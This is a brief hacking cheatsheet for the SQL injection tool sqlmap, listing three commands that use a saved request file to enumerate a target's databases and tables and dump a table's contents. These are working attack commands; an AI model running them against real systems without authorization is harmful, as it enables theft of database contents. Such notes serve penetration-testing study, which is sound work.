-----------------------------------------------
# SQLMap
Tags: #Cheatsheet #Hacking #Tools 
Creation date: 2021-10-04

-----------------------------------------------

### Discover database names

```sqlmap -r <request file> --dbs```

### Show tables in database

```sqlmap -r <request file> -D <database name> --tables```

### Enum table in database

```sqlmap -r <request file> -D <database name> -T <table name> --dump```